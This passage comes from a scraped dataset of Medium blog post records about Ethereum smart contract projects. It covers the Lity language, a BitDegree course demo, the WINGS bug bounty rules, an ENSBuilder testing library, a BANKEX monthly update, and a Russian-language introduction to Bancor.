ERC223 checker in action]ERC721 is the contract standard to issue non-fungible tokens.[Watch our ERC721 checker overview][See the ERC721 checker in action]ERC827 is another enhancement to make ERC20 easier and safer to use while maintaining compatibility with ERC20 tools.[Watch our ERC827 checker overview][See the ERC827 checker in action]ERC884 is a security token standard to issue stick certificates.[Watch our ERC884 checker overview][See the ERC884 checker in action]Integer overflow is one of the most common security issues in Ethereum smart contracts. Lity proactively eliminates the opportunities for integer overflow in smart contract code. How so?The Lityc checks for the use of SafeMath on integers. It throws warnings if integer operations are not wrapped around in SafetMath.The CVM detects integer overflow at runtime, and stops the contract execution with an error vs. continuing with the overflowed integer numbers.", "responses": "1"}, {"title": "BitDegree smart contract course \u201ca great entry point to our financial and educational ecosystem\u201d (MVP\u00a0demo)", "author_name": "BitDegree", "link": "https://blog.bitdegree.org/bitdegree-smart-contract-course-a-great-entry-point-to-our-financial-and-educational-ecosystem-b27946629b1c?source=search_post", "post_date": "Nov 28, 2017", "readtime": "2 min read", "upvotes": "10", "content": "BitDegree smart contract course \u201ca great entry point to our financial and educational ecosystem\u201d (MVP\u00a0demo)BitDegreeBlockedUnblockFollowFollowingNov 28, 2017BitDegree has released a demonstration smart contract course on its Minimal Viable Product (MVP) ahead of its token crowdsale on December 1st, 2017. The course and the MVP can be found on the BitDegree platform.You can check it out HERE.The demo course is based upon the smart-contract course which is being developed in conjunction with BitDegree\u2019s Cryptocurrency Advisor an nexchange.io founder, Oleg Belousov. It will teach the core concepts of the Solidity programming language, which is used to create smart contracts on the ethereum blockchain. Upon its completion, the finalized course will be taught by Belousov.The smart contract course will be aimed at beginner-level web developers who have basic programming knowledge, but would like to develop their skills, plus their understanding of blockchain. They will make progress on the course by completing a series of coding tasks in each lesson.Learners will also be able to interact with the contracts they are coding on the BitDegree platform. The course will allow learners to become more familiar with how the BitDegree token (BDG) based ecosystem worksAbout the smart contract course, Belousov commented: \u201cIt provides exceptional educational value through quality course content, and serves as a great entry point to our financial and educational ecosystem.\u201dUsing an MVP will give potential token sale participants and employers the opportunity to see how the platform will function, and how it will look.From a development perspective, having an MVP will provide BitDegree with the opportunity to gauge feedback from the platform\u2019s early adopters, or those who buy their BitDegree tokens during the very first days of the token sale. Their early engagement with the platform will allow BitDegree\u2019s developers to add or remove products based on user feedback.The MVP model assist will help BitDegree\u2019s developers correctly scale the platform\u2019s rate of growth, and has previously been used by Instagram and Uber to set a realistic development scale.After trying our MVP, please send your feedback to us at [email\u00a0protected], or having a chat with us on Telegram!", "responses": ""}, {"title": "Getting Started with Lity, a #CVM Mini-Series", "author_name": "Mark Brinkerhoff", "link": "https://medium.com/cybermiles/getting-started-with-lity-a-cvm-mini-series-cda2a1265c62?source=search_post", "post_date": "Aug 13, 2018", "readtime": "2 min read", "upvotes": "109", "content": "Getting Started with Lity, a #CVM Mini-SeriesMark BrinkerhoffBlockedUnblockFollowFollowingAug 13, 2018The CyberMiles team recently announced the introduction of Lity, a new programming language for building blockchain-based \u201csmart business contracts.\u201d Lity, whose name is partly meant as an homage to Ethereum\u2019s Solidity, is designed to be, at once, more flexible/extensible (liquid) and better performing (combustable).First Things FirstLity and the CyberMiles virtual machine (CVM) were developed to bring to the blockchain the necessary features that answer real-world needs. These features, which hardly exist (or are non-existent) within projects like Ethereum, include:Safety. Lity makes CyberMiles safer than other chains, avoiding issues (see: Beauty Chain, SmartMesh) that will not occur on CyberMiles\u2019 blockchain.Extensibility. With Lity, Library + Ethereum Native Interface (libENI) functions are optimized for common e-commerce scenarios, decentralized applications (DApps), and customized blockchains.E-commerce functionality. Lity and the CVM make it possible to provide libENI functions optimized for, as one example, PKI-based encryption to protect privacy.Schedulability. Offering an indispensable tool for financial contracts in worldwide use, Lity compares favorably to Ethereum, which can\u2019t easily support functions such as installments for e-commerce purchases, retirement savings, payroll, interest payments, and much, much more.Trust. Behind Lity is a capable, experienced, well-rounded team you can trust to do it right.Service. CyberMiles, an open source, public blockchain, can provide customized services including technology (notably Lity, CVM and smart business contracts), marketing and business operations.Alright, Let\u2019s GoTo get started, you first will need to download and install the Lity compiler. Once installed, you can begin to write and compile a Lity smart contract, and, from there, start a CyberMiles node and execute the smart contract on the blockchain. Our documentation will guide you through this process.1. Download and install the Lity compiler2. Write and compile a Lity smart contract3. Start a CyberMiles node4. Run the smart contract", "responses": ""}, {"title": "RSK Karbon14\u00a0Demo", "author_name": "Karbon14", "link": "https://medium.com/@karbon14/rsk-karbon14-demo-b14c9475e7cc?source=search_post", "post_date": "Jan 25", "readtime": "3 min read", "upvotes": "58", "content": "RSK Karbon14\u00a0DemoKarbon14BlockedUnblockFollowFollowingJan 25In our previous post The karbon14 demo we tested the demo working over the Ethereum Ropsten network, but Karbon14 solution needs a Smart Contract crypto platform to be able to work, which shouldn`t necessarily be Ethereum.Today we want to prove that the above key point is valid for other networks than Ethereum, and we focused on deploying the demo fully working over RSK.", "responses": "1"}, {"title": "How to join the Dispatch Developer Evangelist Program", "author_name": "Zane Witherspoon", "link": "https://medium.com/@zanewithspoon/how-to-join-the-dispatch-developer-evangelist-program-b3879cc3dce?source=search_post", "post_date": "Oct 24, 2018", "readtime": "2 min read", "upvotes": "185", "content": "How to join the Dispatch Developer Evangelist ProgramOr how I learned to stop worrying and spread the\u00a0protocolZane WitherspoonBlockedUnblockFollowFollowingOct 24, 2018Class is in session taught by Professor youIn preparation for the upcoming launch of our Mainnet, Dispatch is officially launching our Developer Evangelist Program. Our goal is to help current and aspiring Developers learn how to build data-centric Dapps for the Dispatch protocol. As a Dispatch Evangelist, you will be on the front lines developing a vibrant global community of Dispatch Dapp Developers.So how do you know if you should become a Developer Evangelist?\u26d3 You want to expand your Solidity programming knowledge\ud83d\udcbb You live to code and teach what you know\ud83e\udd13 You read crypto white papers for fun\ud83d\udc69\u200d\ud83c\udfeb You want to become a smart contract or blockchain expert\ud83d\uddfa You want to have a high impact on the Dispatch roadmap\ud83d\udcad You truly believe in Dispatch\u2019s team, vision, and techWhat\u2019s in it for\u00a0you?\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66 Integration to the Dispatch family\ud83c\udfe0 Assistance with securing locations for your developer meetups\ud83c\udf81 Free Dispatch Developer Kit\ud83d\udd2c Exclusive Dispatch product and technical updatesYour Core Responsibilities:\u270c\ufe0f Run two monthly in-person Dispatch meetups\ud83d\udcf9 Livestream each meetup on at least one social network, such as YouTube, Facebook, or Twitter\ud83e\udd1d Introduce us to interested Dapp developers\ud83d\udc69\u200d\ud83c\udfeb Lead in-person Solidity trainings for your course attendeesWe will be launching our Developer Evangelist program with five evangelists to start and adding more over time. We are accepting applications now. We are excited to have you join us as part of our family. We look forward to meeting you!", "responses": ""}, {"title": "Blockwatch: Berlin Blockchain Day\u00a0Panel", "author_name": "Chris Chinchilla", "link": "https://hackernoon.com/blockwatch-berlin-blockchain-day-panel-22528d94933c?source=search_post", "post_date": "Jan 16, 2018", "readtime": "", "upvotes": "21", "content": "Blockwatch: Berlin Blockchain Day\u00a0PanelChris ChinchillaBlockedUnblockFollowFollowingJan 16, 2018On a cold Friday December night, with a Christmas market buzzing outside, a small group of Blockchain enthusiasts gathered for a \u2018day\u2019 (actually an afternoon) of discussions with luminaries from the community organized by Binary District, a new global education center. As is traditional for events in Berlin, the time of year had thrown well-made plans into disruption, and the organizers have asked me to host a panel between all the speakers.On the panel are Alexander Ivanov (Blockchain entrepreneur), Dmitry Meshkov (Researcher and entrepreneur), Alexander Chepurnoy (Developer), and Vlad Zamfir (Ethereum team). I was interested in digging into how enthusiastic developers take their ideas into reality with smart contracts and \u2018traditional\u2019 programming languages and infrastructure.I wouldn\u2019t say all my questions were exactly answered, but it was an interesting panel nonetheless. Enjoy!", "responses": ""}, {"title": "", "author_name": "LockTrip.com (LOC Token) Official Blog", "link": "https://medium.com/locktrip/we-are-excited-to-announce-our-partnership-with-softuni-a687df4a996a?source=search_post", "post_date": "Nov 15, 2017", "readtime": "2 min read", "upvotes": "36", "content": "LockTrip.com (LOC Token) Official BlogBlockedUnblockFollowFollowingNov 15, 2017We are excited to announce our partnership with\u00a0SoftUni.SoftUni was created by our founder Hristo Tenchev and technology advisor Svetlin Nakov back in 2014, to what has now become one of the leading Technology Academies in Bulgaria.Nakov has a long background in building tech acadamies. He was the main power behind Telerik Academy, with over 9000 people completing their courses. Tenchev, also a programmer himself, joined Nakov in building SoftUni, where it now holds over 50 educational programming courses per year.It was just six months ago, when Aeternity had announced their partnership with SoftUni, to educate BlockChain technology in Bulgaria, via courses and seminars.SoftUni is now offering several courses around Solidity (Ethereum\u2019s programming language), with 400+ enrolled developers.Having SoftUni as our partner and backbone, allows us to dive into what will be one of the largest (global) pool of certified Solidity Developers, to keep expanding LockChain\u2019s footprint on Ethereum\u2019s platform.Bulgaria has a strong potential to become a powerhouse in the blockchain industry, due to the support and growth of a very talented software development community.Our advisor and Aeternity founder, Vladislav Dramaliev, holds a bi-monthly crypto-meetup with over 2000 attendees. A growth of 100x since last year.We see great things coming our way with the support of SoftUni!You can reach us on the following channels:Telegram | Twitter | Facebook | Mail", "responses": ""}, {"title": "The WINGS Bug Bounty\u00a0Program", "author_name": "WINGS Magazine", "link": "https://blog.wings.ai/the-wings-bug-bounty-program-fddfef2369da?source=search_post", "post_date": "Feb 13, 2018", "readtime": "2 min read", "upvotes": "47", "content": "The WINGS Bug Bounty\u00a0ProgramHelp and earn rewards up to 5000\u00a0WINGSWINGS MagazineBlockedUnblockFollowFollowingFeb 13, 2018Calling all security specialistsWe are about to finally launch the mainnet version of WINGS and need your peering eyes combing through the code and finding anything that us and our auditing partners might have missed.The bounty reward is up to 1000 WINGS for issues requiring beta re-deploy, and up to 5000 WINGS for critical issues, all payable in WINGS tokens.500 WINGS: For any severe bugs that don\u2019t require contracts redeploy1,000 WINGS: Any bugs leading to stopping using the current contracts and having to redeploy the new version to the testnet2,500 WINGS reward for bugs allowing any first party to break into their own fundsExample: WINGS tokens owner can transfer the forecast tokens despite them being locked5,000 WINGS reward for bugs allowing any 3rd party to access fundsExample: Anyone can transfer the WINGS tokens in the contractWe follow the bounty rules established by Ethereum Foundation: https://bounty.ethereum.org, such as first come, first serve; any reports submitted by others or already known to the team will not be rewarded.Testnet siteThe testnet is accessible on the following address:https://testnet.wings.aiBounty scopeActual financial losses issues:Impossibility of closing a forecast and getting the locked Wings backImpossibility of getting deposited Wings during project creation backIncorrect calculations of the Ethereum transaction feesCalculations issues:Incorrect calculation and distribution of rewardsWrong distribution of project deposit fee (in case of project rejection or cancellation)Wrong calculation of FRFlow issues:Deadlock of projectSecurity issues:Vulnerabilities (for example: XSS attack)Other issuesBack-end/front-end related issues:Incorrect responses from the APIAny other issue that might prevent the correct platform useNote that some actions could ask for a different gas parameters, so before reporting an issue, test it with a different gas limitOut of\u00a0scope:Browsers bugsAny UX issues on the platformText and grammarSubmission deadlineThe bug bounty ends on 11/3/2018.Responsible DisclosureWe ask you to follow a responsible disclosure:Provide reasonable time to resolve any issues you report before making them public or sharing with anyone elseAvoid violations and disruptions to anyone with the knowledge you gainedNot exploit the security issue, including for demonstration purposesContactPlease send your findings to: bounty@wings.ai, feel free to make the submissions anonymous.Make sure to include your ETH address for receiving your reward.", "responses": ""}, {"title": "Episode 35: Deciphering What\u2019s New, with\u00a0NuCypher", "author_name": "Steven McKie", "link": "https://medium.com/blockchannel/episode-35-deciphering-whats-new-with-nucypher-aff3776cf958?source=search_post", "post_date": "Dec 16, 2017", "readtime": "", "upvotes": "64", "content": "Episode 35: Deciphering What\u2019s New, with\u00a0NuCypherWith Guests John Pacific & Michael\u00a0EgorovSteven McKieBlockedUnblockFollowFollowingDec 16, 2017Press Play!On this episode of BlockChannel, Mckie and Petty sit down with John Pacific and Michael Egorov of the NuCypher project to learn more about their upcoming protocol token for encryption services. Their platform enables users to create key-based authentication to create permissioned access to platforms and services that are created by other DApp developers by utilizing Ethereum smart contracts. Think of it like Keybase\u2026but for enterprise and developers looking to more easily shield and protect their personal data. It\u2019s a great project with a lot of potential and these guys really know their stuff\u200a\u2014\u200aso we dove in to get to the bottom of their vision.Show Links:NuCypher Site: https://www.nucypher.com/NuCypher Telegram: t.me/nucypherIntro/Outro Music \u201cPart Two\u201d by Meech: https://soundcloud.com/ovaeastmeech/part-two?in=ovaeastmeech/sets/truecoloursShow Sponsor(s):Bitcoin Cash: https://bitcoincash.orgDisclaimer: This is not investment advice, it is an engaged discussion on new technology; BlockChannel reminds you to always do your own due diligence before investing in any crypto-related project in the industry.", "responses": ""}, {"title": "Testing contracts that use ENS with ENSBuilder", "author_name": "Marek Kirejczyk", "link": "https://medium.com/ethworks/testing-contracts-that-use-ens-with-ensbuilder-1806592da57f?source=search_post", "post_date": "Sep 27, 2018", "readtime": "2 min read", "upvotes": "51", "content": "Testing contracts that use ENS with ENSBuilderMarek KirejczykBlockedUnblockFollowFollowingSep 27, 2018When it comes to testing contracts and functionality that uses Ethereum Naming System (ENS), it is a bit tricky. It is difficult to test in isolation from ENS, and it is hard to stub\u00a0ENS.We stumble upon that challenge when working on Universal Login SDK.To solve that problem we created a simple library called ENSBuilder, which allows one to quickly set up and configure a standalone instance of ENS, on a local environment, in tests or on a test chain.With ENSBuilder setup is as easy as a single method call:const ensAddress = await builder.bootstrapWith(\u2018example\u2019, \u2018eth\u2019);And you already have a copy of ENS, up and running, as well as two domains registered: \u2018ens\u2019 and \u2018example.ens\u2019.You can now register an address:await builder.registerAddress(\u2018marek\u2019, \u2018example.eth\u2019, \u20180x\u2026\u2019);Ethers.jsThe builder uses ethers.js as a contract abstraction. Web3js is also supported but will require you to pass a private key. We plan to add better web3js support if we see requests from people to do it. We would also happily accept PRs\u00a0:)Why Ethers.js you may ask?We find ethers.js to be a stable, light, feature complete and production ready alternative to web3js. Therefore we are using it both for tests as well as application code.Getting StartedFor in-depth information as well as a quick tutorial go to EnsBuilder GitHub.", "responses": ""}, {"title": "Learn: New Resources Available at LearnChannels.org", "author_name": "Steven McKie", "link": "https://medium.com/blockchannel/learn-new-resources-available-at-learnchannels-org-2f784fab7835?source=search_post", "post_date": "Sep 18, 2018", "readtime": "", "upvotes": "59", "content": "Learn: New Resources Available at LearnChannels.orgState Channel Education for\u00a0EveryoneSteven McKieBlockedUnblockFollowFollowingSep 18, 2018While state and payment channels are a key component of Layer 2 scaling, accessible information about them is either scattered across the internet or simply nonexistent. LearnChannels, a community effort by state channel researchers and implementers, is changing that.On LearnChannels, you\u2019ll find technical and nontechnical explanations, code walkthroughs, and much more. We aim to create a one-stop shop for anyone interested in learning more about state and payment channels\u200a\u2014\u200aseasoned Web3 developers and laymen will both find information suited to their needs.LearnChannels welcomes community contributions; code examples, explainers, translations, and web design are all great ways to help. If you\u2019re interested, please submit a PR with a\u00a0.md or HTML file to this repository or send a message to @hthillman on Twitter!", "responses": ""}, {"title": "BANKEX Monthly Update: August\u00a02018", "author_name": "BANKEX", "link": "https://blog.bankex.org/bankex-monthly-update-august-2018-c82606265430?source=search_post", "post_date": "Sep 6, 2018", "readtime": "6 min read", "upvotes": "203", "content": "BANKEX Monthly Update: August\u00a02018BANKEXBlockedUnblockFollowFollowingSep 6, 2018The last month of summer has come to an end. It\u2019s time to look back on everything BANKEX achieved in August. Over this past month, we launched BANKEX Pay for Ethereum transactions, released the mobile version of BANKEX Scan, presented the tokenized YouTube channel, and listed our utility token on Coinswitch.co, one of the world\u2019s largest cryptocurrency exchange aggregators.New Tech and\u00a0ServicesBANKEX PayThis month, our team launched BANKEX Pay\u200a\u2014\u200aa powerful and easy-to-use Ethereum wallet, customized for iOS devices. It\u2019s a robust solution that enables you to make transactions, estimate gas costs, and generate receipts.Use BANKEX Pay to easily store, send, and receive crypto assets, all from your iOS device. The wallet can also store ERC-20 and ERC-223 tokens. Going forward, expect BANKEX Pay to support a wide range of tokens, including ERC-721 and ERC-888. The app has an intuitive interface that makes it an ideal wallet for crypto newbies and experienced crypto traders alike.The app also offers top-notch security. It employs a native API as well as BANKEX\u2019s own Web3swift library to interact with the blockchain. In addition, the wallet uses a digital signature for transactions while the library itself stores keys. Users\u2019 private keys are protected from jailbreaks and root rights, so they will be as secure as on a hard wallet. The BANKEX Pay app for iOS can be downloaded here.BANKEX Pay Comes to iOSMobile wallets take the concept of crypto wallets and make them more convenient and accessible; no matter where a user\u2026blog.bankex.orgMobile Version of BANKEX\u00a0ScanBANKEX Scan is a service that can search for Ethereum transactions by address, TxHash, or block number. It also can return transaction details such as ETH volume, fees, block number, sender/recipient address, transaction time, and whether the transaction was successful. This makes it similar to other Ethereum scanning solutions, but with an important added feature: it can also scan ERC-721 tokens and display their balances. This information will be displayed separately from other transaction data.\u00a0BANKEX Scan for Android tablets and smartphones is up on Google Play. Get the same exact functionality as the web version\u200a\u2014\u200aeasy access to information on the Ethereum blockchain\u200a\u2014\u200anow on your mobile device.BANKEX Scan Expands Users\u2019 Horizons as Well as its OwnFor the uninitiated, any sort of blockchain implementation can seem abstruse, as if extracting information quickly and\u2026blog.bankex.orgTechHives\u200a\u2014\u200aThe First Tokenized Youtube\u00a0ChannelTechHives is a trending YouTube channel dedicated to infotainment about tech for non-tech people. With the help of BANKEX MediaToken, TechHives has become the first tokenized YouTube account and is now attracting contributors from all over the world. MediaToken provides contributors with full access to all social media channel performance metrics, offering detailed account analysis, including real-time reports on likes, views, shares, and other indicators. Channel owners report their income and expenses. As tokenized channels grow and attract advertisers, token holder revenue increases. In exchange, bloggers and social media channel owners get the funds they need to develop their channel. The MediaToken funding model sidesteps bank loan applications, intermediaries, and high financing fees. Instead, MediaToken offers security, simple automated processes, and rapid growth.New Exchange AggregatorAfter the successful launch of several new products and services, BANKEX\u2019s founders have decided that it\u2019s time to make the BKX utility token more accessible to potential token holders. To put this into practice, we have worked to get BKX listed on a number of large crypto exchanges and exchange aggregators. This month, BANKEX established a partnership with Coinswitch.co\u200a\u2014\u200athe world\u2019s leading cryptocurrency exchange aggregator platform, with 250+ coins and 6000+ currency pairs. As of 2018, it has been hitting a volume of 1 million USD per day. Among the exchanges listed on Coinswitch.co are Bittrex, Changelly, Shapeshift, and Cryptopia.BANKEX Among Top 3 Supported Currencies on CoinSwitchBANKEX has announced the listing of its BKX token on CoinSwitch, a cryptocurrency and altcoin exchange aggregator\u2026blog.bankex.orgTechThis August we explained 9 vulnerabilities of Smart Contracts that everyone should know.Nine Pitfalls of Ethereum Smart Contracts to Be Avoided:A Clear Explanation of Vulnerabilitiesblog.bankex.orgMediaHow Banks Can Become Blockchain Innovators-or Fall BehindTechnology Blockchain Disruption Founder and CEO of BANKEX At its simplest, a blockchain-based currency such as bitcoin\u2026www.brinknews.comThe First Tokenization Of a YouTube Channel is Completed Successfully With BANKEX MediaToken\u00a0\u2026The First Tokenization Of a YouTube Channel is Completed Successfully With BANKEX MediaToken Trending YouTube channel\u2026www.investinblockchain.comBANKEX opens the way to get citizenship via cryptocurrency investment - AMBCrypto30 July 2018, New York- BANKEX, in association with the MIGRONIS KFT immigration company, the MDL Legal Services PLLC\u2026ambcrypto.com6 Month Recap: What Comes Next After Bankex Successful Token Sale - Fintech Hong KongUndoubtedly, the year 2017 was the \"Year of Crypto.\" While the word \"bitcoin\" became one of the most popular Google\u2026fintechnews.hkPress Release: BANKEX Pay Ethereum Wallet, Store Tokens and Make Transactions Available Now in the\u2026BANKEX Pay is a user-friendly Ethereum wallet that securely stores crypto assets, enables users to make transactions\u2026www.trustnodes.comBANKEX Custody Service - Your Personal Crypto Vault-AMBCryptoBANKEX has launched Custody Service, a blockchain-based cryptocurrency storage solution with no minimum deposit limit\u2026ambcrypto.comNew EventsIn August BANKEX visited the IFC\u200a\u2014\u200aInternational Finance Corporation World Bank Group Headquarters Headquarters to help promote the application of blockchain technology in global supply chains.BANKEX Team attended the Ethereum Bangkok Community Meetup to present our groundbreaking technologies and bond with fellow blockchain-based companies, such as OmiseGO.Blockchain Education: BANKEX Foundation School conducted a 4-day Intensive Course on SolidityBANKEX Foundation developers Artem Vorobyev, Kirill Kuznetsov, and Nikita Kozlov broke down the complex world of smart contracts in a solidity course that consisted of 20 hours of lectures and practical learning. Each student received a unique certificate upon completion.What to Expect in SeptemberWe continue working non-stop to merge real-life assets with blockchain technology.BANKEX Foundation team is participating in ETH Berlin Hackathon:Ethereum Industry SummitETHIS\uff08Ethereum Industry Summit\uff09is a nonprofit global conference organized by LinkTime, a company that is part of the\u2026ethis.ioThe first month of Autumn will be very eventful, as we are launching a number of major blockchain products and technologies.Stay tuned!", "responses": ""}, {"title": "", "author_name": "Anthony Akentiev", "link": "https://hackernoon.com/bankers-rounding-for-smart-contracts-2bccd0b664?source=search_post", "post_date": "Mar 26", "readtime": "3 min read", "upvotes": "64", "content": "\u201cBankers Rounding\u201d for Smart ContractsAnthony AkentievBlockedUnblockFollowFollowingMar 26Hello everyone! My name is Anton, and I\u2019m the CTO at crypto.tickets. Crypto Tickets has developed the new decentralized ticketing protocol that protects tickets from being counterfeited or double sold. The appeals of Crypto Tickets for event organizers are the abilities to control the secondary market, retain extra commissions on every ticket resale, prohibit resales entirely, or allow resales only for authorized fans. This technology is designed to be an add-on for any ticket selling technology on the market.", "responses": ""}, {"title": "\u041f\u0440\u043e\u0442\u043e\u043a\u043e\u043b Bancor", "author_name": "Bancor", "link": "https://ru.blog.bancor.network/%D0%BF%D1%80%D0%BE%D1%82%D0%BE%D0%BA%D0%BE%D0%BB-bancor-1e5b3dd22597?source=search_post", "post_date": "Jul 13, 2017", "readtime": "2 min read", "upvotes": "3", "content": "\u041f\u0440\u043e\u0442\u043e\u043a\u043e\u043b BancorBancorBlockedUnblockFollowFollowingJul 13, 2017\u041f\u0440\u0438\u0432\u0435\u0442 \u041c\u0438\u0440! \u041c\u044b \u043a\u043e\u043c\u0430\u043d\u0434\u0430 \u043f\u0440\u043e\u0435\u043a\u0442\u0430 Bancor Protocol (PDF) \u0438 \u043c\u044b \u0441\u043e\u0437\u0434\u0430\u0451\u043c \u0434\u0435\u0446\u0435\u043d\u0442\u0440\u0430\u043b\u0438\u0437\u043e\u0432\u0430\u043d\u043d\u0443\u044e, \u0438\u0435\u0440\u0430\u0440\u0445\u0438\u0447\u0435\u0441\u043a\u0443\u044e \u043c\u043e\u043d\u0435\u0442\u0430\u0440\u043d\u0443\u044e \u0441\u0438\u0441\u0442\u0435\u043c\u0443 \u043d\u0430 \u0431\u043b\u043e\u043a\u0447\u0435\u0439\u043d\u0435\u0415\u0441\u043b\u0438 \u043f\u043e\u0441\u043c\u043e\u0442\u0440\u0435\u0442\u044c \u043d\u0430 \u043c\u0438\u0440 \u043e\u0431\u043c\u0435\u043d\u0430 \u043c\u0435\u0436\u0434\u0443 \u043b\u044e\u0434\u044c\u043c\u0438, \u043c\u044b \u0443\u0432\u0438\u0434\u0438\u043c \u0434\u0432\u0435 \u043e\u0441\u043d\u043e\u0432\u043d\u044b\u0445 \u043a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u0438 \u0432\u0435\u0449\u0435\u0439, \u043a\u043e\u0442\u043e\u0440\u044b\u043c\u0438 \u043c\u044b \u043e\u0431\u043c\u0435\u043d\u0438\u0432\u0430\u0435\u043c\u0441\u044f \u0438 \u0442\u043e\u0440\u0433\u0443\u0435\u043c\u200a\u2014\u200a\u0418\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f \u0438 \u0426\u0435\u043d\u043d\u043e\u0441\u0442\u044c. \u0415\u0441\u043b\u0438 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f (\u0442\u0430\u043a\u043e\u0439 \u043a\u043e\u043d\u0442\u0435\u043d\u0442 \u043a\u0430\u043a \u0442\u0435\u043a\u0441\u0442\u044b, \u043a\u0430\u0440\u0442\u0438\u043d\u043a\u0438, \u0432\u0438\u0434\u0435\u043e, \u0442.\u0434.) \u0437\u0430\u043c\u0435\u043d\u044f\u0435\u043c\u0430 \u043f\u043e \u0441\u0432\u043e\u0435\u0439 \u043d\u0430\u0442\u0443\u0440\u0435 (\u043a\u043e\u0433\u0434\u0430 \u0432\u044b \u0434\u0435\u043b\u0438\u0442\u0435\u0441\u044c \u0435\u044e, \u0442\u043e \u0432\u044b \u0438 \u043a\u0442\u043e-\u0442\u043e \u0435\u0449\u0451 \u0432\u043b\u0430\u0434\u0435\u0435\u0442\u0435 \u0435\u044e), \u0442\u043e \u0446\u0435\u043d\u043d\u043e\u0441\u0442\u044c\u200a\u2014\u200a\u043d\u0435\u0442 (\u043a\u043e\u0433\u0434\u0430 \u0432\u044b \u043e\u0442\u0434\u0430\u0435\u0442\u0435 \u0435\u0451 \u043a\u043e\u043c\u0443-\u043d\u0438\u0431\u0443\u0434\u044c, \u0432\u044b \u0431\u043e\u043b\u044c\u0448\u0435 \u043d\u0435 \u0432\u043b\u0430\u0434\u0435\u0435\u0442\u0435 \u0435\u044e).\u0417\u0430 \u043d\u0435\u043a\u043e\u0442\u043e\u0440\u043e\u0435 \u0432\u0440\u0435\u043c\u044f \u0434\u043e \u043f\u043e\u044f\u0432\u043b\u0435\u043d\u0438\u044f \u0418\u043d\u0442\u0435\u0440\u043d\u0435\u0442\u0430, \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u043e\u0432\u0430\u043b\u043e \u0431\u043e\u043b\u044c\u0448\u043e\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0447\u0430\u0441\u0442\u043d\u044b\u0445 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u043e\u043d\u043d\u044b\u0445 \u0441\u0435\u0442\u0435\u0439, \u043d\u0435\u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u0438\u0437 \u0412\u0430\u0441 \u0434\u0430\u0436\u0435 \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e \u0437\u0430\u0441\u0442\u0430\u043b\u0438 \u0438\u0445. \u041d\u0430\u043f\u0440\u0438\u043c\u0435\u0440 BBSs, Prodigy, Compuserve, AoL. \u0421\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u0435 \u043e\u0431\u0449\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u043e\u0433\u043e \u0418\u043d\u0442\u0435\u0440\u043d\u0435\u0442\u0430 \u0432\u0441\u0451 \u0438\u0437\u043c\u0435\u043d\u0438\u043b\u043e, \u0438 \u0442\u0435, \u043a\u0442\u043e \u0432\u044b\u0436\u0438\u043b, \u043d\u0430\u0443\u0447\u0438\u043b\u0438\u0441\u044c \u043f\u0440\u0438\u0441\u043f\u043e\u0441\u0430\u0431\u043b\u0438\u0432\u0430\u0442\u044c\u0441\u044f \u043a \u043d\u043e\u0432\u044b\u043c \u043e\u0442\u043a\u0440\u044b\u0442\u044b\u043c, \u0432\u0441\u0435\u043c\u0438\u0440\u043d\u044b\u043c \u0441\u0442\u0430\u043d\u0434\u0430\u0440\u0442\u0430\u043c \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u043e\u043d\u043d\u043e\u0433\u043e \u043e\u0431\u043c\u0435\u043d\u0430, \u043e\u0441\u043d\u043e\u0432\u0430\u043d\u043d\u044b\u043c\u0438 \u043d\u0430 \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0438 \u0441\u0435\u0442\u0435\u0439 TCP/IP, \u0432\u0437\u0430\u0438\u043c\u043e\u0441\u0432\u044f\u0437\u0430\u043d\u043d\u044b\u0445 \u0447\u0435\u0440\u0435\u0437 \u043f\u0438\u0440\u0438\u043d\u0433\u043e\u0432\u044b\u0435 \u0441\u043e\u0433\u043b\u0430\u0448\u0435\u043d\u0438\u044f.\u0414\u043e \u043f\u043e\u044f\u0432\u043b\u0435\u043d\u0438\u044f \u0442\u0435\u0445\u043d\u043e\u043b\u043e\u0433\u0438\u0438 \u0431\u043b\u043e\u043a\u0447\u0435\u0439\u043d, \u0432\u0441\u0435 \u0432\u0430\u043b\u044e\u0442\u044b, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u043f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u043b\u044f\u043b\u0438 \u043a\u0430\u043a\u0443\u044e-\u043b\u0438\u0431\u043e \u0446\u0435\u043d\u043d\u043e\u0441\u0442\u044c, \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u043e\u0432\u0430\u043b\u0438 \u043e\u0442\u0434\u0435\u043b\u044c\u043d\u043e \u0434\u0440\u0443\u0433 \u043e\u0442 \u0434\u0440\u0443\u0433\u0430. \u0411\u043b\u043e\u043a\u0447\u0435\u0439\u043d \u0442\u0435\u0445\u043d\u043e\u043b\u043e\u0433\u0438\u044f\u200a\u2014\u200a\u0432\u043f\u0435\u0440\u0432\u044b\u0435 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u043d\u0430\u044f \u0432 \u0411\u0438\u0442\u043a\u043e\u0438\u043d\u0435\u200a\u2014\u200a\u044d\u0442\u043e \u0434\u0435\u0446\u0435\u043d\u0442\u0440\u0430\u043b\u0438\u0437\u043e\u0432\u0430\u043d\u043d\u0430\u044f \u0441\u0435\u0442\u044c \u043e\u0431\u043c\u0435\u043d\u0430 \u0446\u0435\u043d\u043d\u043e\u0441\u0442\u044f\u043c\u0438, \u201c\u0418\u043d\u0442\u0435\u0440\u043d\u0435\u0442 \u0434\u0435\u043d\u0435\u0433\u201d. \u0421\u043e \u0432\u0440\u0435\u043c\u0435\u043d\u0435\u043c \u044d\u0442\u0430 \u0442\u0435\u0445\u043d\u043e\u043b\u043e\u0433\u0438\u044f \u0437\u0430\u043c\u0435\u043d\u0438\u0442 \u0431\u043e\u043b\u044c\u0448\u0443\u044e \u0447\u0430\u0441\u0442\u044c 